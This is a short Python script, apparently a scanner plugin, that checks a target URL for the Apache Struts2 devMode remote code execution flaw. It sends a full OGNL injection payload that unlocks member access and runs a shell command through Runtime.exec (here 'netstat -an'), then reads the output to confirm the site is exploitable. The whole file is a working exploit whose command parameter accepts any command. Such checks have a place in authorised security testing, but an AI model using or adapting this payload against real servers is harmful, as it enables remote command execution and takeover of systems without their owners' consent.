#! /usr/bin/env python
#coding:utf-8
import requests

author = ""
scope = ""
description = "Struts2 远程代码执行漏洞"
reference = ""
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]

def struts2_devmode(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -an'''
    url += exp

    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-devmode 存在利用"
    except:
        return None
    return None